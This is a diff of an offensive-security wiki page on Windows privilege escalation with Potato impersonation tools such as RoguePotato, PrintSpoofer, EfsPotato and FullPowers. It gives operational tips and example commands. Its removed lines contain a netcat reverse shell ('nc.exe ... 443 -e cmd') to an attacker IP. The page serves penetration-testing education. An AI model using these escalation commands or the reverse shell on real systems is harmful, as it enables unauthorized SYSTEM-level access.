@@ -40,7 +40,7 @@ Operational notes:
 - If your shell runs under a restricted token lacking SeImpersonatePrivilege (common for Local Service/Network Service in some contexts), regain the account’s default privileges using FullPowers, then run a Potato. Example: `FullPowers.exe -c "cmd /c whoami /priv" -z`<sup>[[10]](#references)[[11]](#references)</sup>
 - A process token can have fewer privileges than another token for the same service account or logon session. In some configurations, a same-session named-pipe client can expose a different token with SeImpersonatePrivilege, but the service's configured `RequiredPrivileges` and `whoami /priv` describe different things and do not prove such a token is available. Verify the actual token before considering an impersonation path.
 - PrintSpoofer needs the Print Spooler service running and reachable over the local RPC endpoint (spoolss). In hardened environments where Spooler is disabled post-PrintNightmare, prefer RoguePotato/GodPotato/DCOMPotato/EfsPotato.
-- RoguePotato requires an OXID resolver reachable on TCP/135. If egress is blocked, use a redirector/port-forwarder (see example below). Older builds needed the -f flag.
+- RoguePotato requires an OXID resolver reachable on TCP/135. If egress is blocked, use a redirector/port-forwarder (see example below). Check the flags supported by the build in use.
 - EfsPotato/SharpEfsPotato abuse MS-EFSR; if one pipe is blocked, try alternative pipes (lsarpc, efsrpc, samr, lsass, netlogon).
 - Error 0x6d3 during RpcBindingSetAuthInfo typically indicates an unknown/unsupported RPC authentication service; try a different pipe/transport or ensure the target service is running.
 - “Kitchen-sink” forks such as DeadPotato bundle extra payload modules (Mimikatz/SharpHound/Defender off) which touch disk; expect higher EDR detection compared to the slim originals.
@@ -71,10 +71,10 @@ Notes:
 ### RoguePotato
 
 ```bash
-c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
-# In some old versions you need to use the "-f" param
-c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
+c:\RoguePotato.exe -r 10.10.10.10 -e "cmd.exe /c whoami" -l 9999
 ```
+
+In the [upstream usage](https://github.com/antonioCoco/RoguePotato#usage), `-e` supplies the command, `-l` selects the local resolver port, and the optional `-c` selects a CLSID. If COM activation starts a service whose executable path was already modified, that service can execute its changed command independently of token impersonation; inspect the service configuration before attributing observed SYSTEM execution to this technique.
 
 If outbound 135 is blocked, pivot the OXID resolver via socat on your redirector:<sup>[[9]](#references)</sup>
 
